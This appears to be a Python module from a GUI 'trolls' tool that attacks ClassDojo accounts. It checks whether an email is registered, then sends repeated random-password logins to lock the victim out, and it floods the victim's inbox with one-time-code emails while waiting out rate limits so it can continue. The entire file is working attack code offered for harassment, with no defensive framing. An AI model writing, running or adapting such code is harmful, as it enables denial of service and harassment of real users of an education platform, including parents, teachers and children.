import threading
import random
import time

import requests

import dearpygui.dearpygui as dpg
from pycparser.c_ast import While

import Libs.General
import themes
from Libs import ThreadManager
from Libs.StatusManager import status

def classdojo_check_account(email:str):
    res = requests.get(f"https://home.classdojo.com/api/user/emailValidation/{email}")
    data = res.json()
    #print(data)
    if not data.get("isAvailableForSignUp", False):
        return False
    else:
        return data

def classdojo_account_locker():
    result_text = "trolls.classdojo_account_locker_result_text"

    email = dpg.get_value("trolls.classdojo_account_locker").strip()

    if not email:
        themes.set_colored_result(result_text, "you kinda forgot the email...", "Red")
        return

    if classdojo_check_account(email):
        themes.set_colored_result(result_text, "account no exist...", "Red")
        return

    themes.set_colored_result(result_text, "locking account...", "Mauve")
    for i in range(15):
        classdojo_account_locker_request(email, result_text)
        time.sleep(random.uniform(0.25,0.75))
    if status.read("trolls/classdojo_account_locker/didLock", False):
        themes.set_colored_result(result_text, f"account has been locked", "Green")
    status.reset("trolls/classdojo_account_locker")

def classdojo_account_locker_request(email:str, result_text:str):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': 'https://www.classdojo.com',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.classdojo.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=0',
    }

    params = {
        'duration': 'long',
    }

    json_data = {
        'login': email,
        'password': Libs.General.random_string(12),
        'resumeAddClassFlow': False,
    }

    res = requests.post('https://home.classdojo.com/api/session', params=params, headers=headers, json=json_data)
    data = res.json()

    error_details = data.get("error")
    if error_details == None:
        themes.set_colored_result(result_text, f"uhhhh idk how this happened but you got into the account lol.", "Red")
        return

    attemptsLeft = error_details.get("extras", {}).get("remainingAttempts")

    error_code = error_details.get("code")

    if status.read("trolls/classdojo_account_locker/stop", False) == False:
        if attemptsLeft != None and error_code == "ERR_INCORRECT_PASSWORD":
            themes.set_colored_result(result_text, f"locking account...\nattempt: {attemptsLeft}", "Mauve")
        elif error_code == "ERR_ACCOUNT_LOCKED_OUT":
            status.write("trolls/classdojo_account_locker/stop", True)
            status.write("trolls/classdojo_account_locker/didLock", True)
            return
        elif attemptsLeft is not None and error_code != "ERR_INCORRECT_PASSWORD" or error_code != "ERR_ACCOUNT_LOCKED_OUT":
            themes.set_colored_result(result_text, f"{error_code} weird code but still got attempts: {attemptsLeft}\n{data}", "Red")
        else:
            themes.set_colored_result(result_text, f"something happened idk\n{data}", "Red")
            status.write("trolls/classdojo_account_locker/stop", True)
            return

def classdojo_code_spammer():
    result_text = "trolls.classdojo_code_spammer_result_text"

    email = dpg.get_value("trolls.classdojo_code_spammer").strip()

    if not email:
        themes.set_colored_result(result_text, "you kinda forgot the email...", "Red")
        return

    if classdojo_check_account(email):
        themes.set_colored_result(result_text, "account no exist...", "Red")
        return

    ThreadManager.do_thread(classdojo_code_spammer_thread, (email, result_text,))


def classdojo_code_spammer_request(email:str, result_text:str):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://home.classdojo.com/',
        'x-client-identifier': 'Web',
        'x-sign-attachment-urls': 'true',
        'Content-Type': 'application/json',
        'Origin': 'https://home.classdojo.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Priority': 'u=0',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    json_data = {
        'email': email,
    }

    response = requests.post('https://home.classdojo.com/api/oneTimeCode', headers=headers, json=json_data)
    if response.status_code == 429:
        status.write("trolls/classdojo_code_spammer/rate_limited", True)
    else:
        code_count = status.read("trolls/classdojo_code_spammer/code_send_count", 0)
        code_count += 1
        status.write("trolls/classdojo_code_spammer/code_send_count", code_count)

def classdojo_code_spammer_stop():
    status.write("trolls/classdojo_code_spammer/stop", True)
    ThreadManager.clear_threads()

def classdojo_code_spammer_thread(email:str, result_text:str):
    themes.set_colored_result(result_text, "sending codes...", "Mauve")

    while True:
        classdojo_code_spammer_request(email, result_text)
        time.sleep(random.uniform(0.1, 0.25))
        if status.read("trolls/classdojo_code_spammer/rate_limited", False):
            delay_time = random.uniform(10, 60)
            for i in range(round(delay_time)):
                if status.read("trolls/classdojo_code_spammer/stop", False):
                    break
                themes.set_colored_result(result_text, f"got rate limited waiting {round(delay_time)-i}", "Red")
                time.sleep(1)
        else:
            code_send = status.read("trolls/classdojo_code_spammer/code_send_count", 0)
            themes.set_colored_result(result_text, f"sent {code_send} code emails", "Mauve")
        if status.read("trolls/classdojo_code_spammer/stop", False):
            themes.set_colored_result(result_text, f"finished :3", "Green")
            break

    status.reset("trolls/classdojo_code_spammer")